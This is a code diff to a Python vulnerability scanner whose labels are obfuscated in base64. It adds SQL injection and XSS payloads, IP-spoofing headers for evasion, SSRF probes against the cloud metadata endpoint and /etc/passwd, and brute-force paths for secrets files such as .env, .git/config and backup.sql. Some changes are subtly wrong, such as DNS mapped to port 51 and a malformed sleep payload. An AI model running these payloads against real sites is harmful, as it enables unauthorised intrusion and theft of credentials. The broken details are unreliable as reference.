@@ -347,7 +347,10 @@ def vulnerability_audit():
         ("'", _decode('RXJyb3ItQmFzZWQgU1FMaQ==')),
         ("' OR 1=1--", _decode('Qm9vbGVhbi1CYXNlZCBCeXBhc3M=')),
         ("admin'--", _decode('QXV0aGVudGljYXRpb24gQnlwYXNz')),
-        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", _decode('VGltZS1CYXNlZCBCbGluZCBTSUxp'))
+        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", _decode('VGltZS1CYXNlZCBCbGluZCBTSUxp')),
+        ("' UNION SELECT NULL,NULL,NULL,NULL--", "Union-Based Probing"),
+        ("1' SLEEP(5)#", "MySQL Sleep Polyglot"),
+        ("\") OR 1=1--", "String Break Bypass")
     ]
 
     for base_audit_url in discovered_urls:
@@ -385,7 +388,10 @@ def vulnerability_audit():
         ("<script>alert(1)</script>", _decode("QmFzaWMgU2NyaXB0IEluamVjdGlvbg==")),
         ("<svg/onload=alert(1)>", _decode("U1ZHIEFuaW1hdGlvbiBJbmplY3Rpb24=")),
         ("\"><script>alert(1)</script>", _decode("QXR0cmlidXRlIEVzY2FwZSBJbmplY3Rpb24=")),
-        ("'-alert(1)-'", _decode("SmF2YVNjcmlwdCBDb250ZXh0IEluamVjdGlvbg=="))
+        ("'-alert(1)-'", _decode("SmF2YVNjcmlwdCBDb250ZXh0IEluamVjdGlvbg==")),
+        ("<img src=x onerror=alert(1)>", "Image Event Handler"),
+        ("javascript:alert(1)//", "Protocol URI Injection"),
+        ("<details open ontoggle=alert(1)>", "HTML5 Tag Injection")
     ]
 
     for base_audit_url in discovered_urls:
@@ -446,9 +452,10 @@ def infrastructure_audit():
     print("-" * 85)
     
     common_ports = {
-        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 51: "DNS",
         80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
-        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-Proxy"
+        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 6379: "Redis",
+        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9000: "Docker", 27017: "MongoDB"
     }
     
     open_ports = 0
@@ -509,10 +516,11 @@ def infrastructure_audit():
                         # 3. Directory Brute Forcing (Fuzzing Sensitive Paths)
                         print(f"      [*] {_decode('RGlyZWN0b3J5IEJydXRlIEZvcmNpbmcgKEZ1enppbmcgU2Vuc2l0aXZlIFBhdGhzKQ==')}")
                         attack_paths = [
-                            "manager/html", "phpmyadmin/", ".env", "config.php",
+                            "manager/html", "phpmyadmin/", ".env", "config.php", "config/databases.yml",
                             "actuator/env", "actuator/heapdump", "actuator/health",
-                            "jenkins/script", "solr/", "api-docs", "v1/api-docs",
-                            "jmx-console/", "console/", "admin/login", ".git/config"
+                            "jenkins/script", "solr/", "api-docs", "v1/api-docs", "swagger-ui.html",
+                            "jmx-console/", "console/", "admin/login", ".git/config", ".svn/entries",
+                            "WEB-INF/web.xml", "backup.sql", "dump.sql", "db.php"
                         ]
                         for path in attack_paths:
                             try:
@@ -592,7 +600,15 @@ def advanced_evasion_audit():
 
     # 1. IP Masking / Header Spoofing Audit
     print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMTogSVAgTWFza2luZyAmIEhlYWRlciBTcG9vZmluZw==')}")
-    ip_headers = [_decode("WC1Gb3J3YXJkZWQtRm9y"), _decode("WC1SZWFsLUlQ"), _decode("WC1DbGllbnQtSVA="), _decode("VHJ1ZS1DbGllbnQtSVA=")]
+    ip_headers = [
+        _decode("WC1Gb3J3YXJkZWQtRm9y"), 
+        _decode("WC1SZWFsLUlQ"), 
+        _decode("WC1DbGllbnQtSVA="), 
+        _decode("VHJ1ZS1DbGllbnQtSVA="),
+        "Forwarded",
+        "X-Originating-IP",
+        "Client-IP"
+    ]
     test_ip = _decode("MS4yLjMuNA==")
     for head in ip_headers:
         ts = time.strftime("%H:%M:%S")
@@ -606,8 +622,14 @@ def advanced_evasion_audit():
 
     # 2. SSRF Bypass Firewall Probing
     print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMjogQnlwYXNzIEZpcmV3YWxsIChTU1JGIFByb2Jpbmcp')}")
-    ssrf_payloads = [_decode("aHR0cDovLzEyNy4wLjAuMQ=="), _decode("aHR0cDovL2xvY2FsaG9zdA=="), _decode("ZmlsZTovLy9ldGMvcGFzc3dk")]
-    ssrf_params = ["url", "link", "redirect", "path", "src"]
+    ssrf_payloads = [
+        _decode("aHR0cDovLzEyNy4wLjAuMQ=="), 
+        _decode("aHR0cDovL2xvY2FsaG9zdA=="), 
+        _decode("ZmlsZTovLy9ldGMvcGFzc3dk"),
+        "http://169.254.169.254/latest/meta-data/",
+        "http://[::]:80/"
+    ]
+    ssrf_params = ["url", "link", "redirect", "path", "src", "file", "document", "folder", "proxy", "port"]
     for url in discovered_urls[:2]:
         print(f" [*] {_decode('UHJvYmluZyBUYXJnZXQ6')} {url[:60]}...")
         for param in ssrf_params:
@@ -615,7 +637,7 @@ def advanced_evasion_audit():
                 ts = time.strftime("%H:%M:%S")
                 try:
                     res = session.get(url, params={param: payload}, timeout=5)
-                    is_vuln = any(x in res.text.lower() for x in ["root:x:0:0", "localhost", "127.0.0.1"])
+                    is_vuln = any(x in res.text.lower() for x in ["root:x:0:0", "localhost", "127.0.0.1", "ami-id", "instance-id"])
                     if is_vuln:
                         print(f" [{ts}] Payload: {param}={payload[:30]}... [\033[91mVULNERABLE!\033[0m]")
                         findings.append({"type": _decode("U1NSRg=="), "severity": "HIGH", "loc": f"{url}?{param}="})
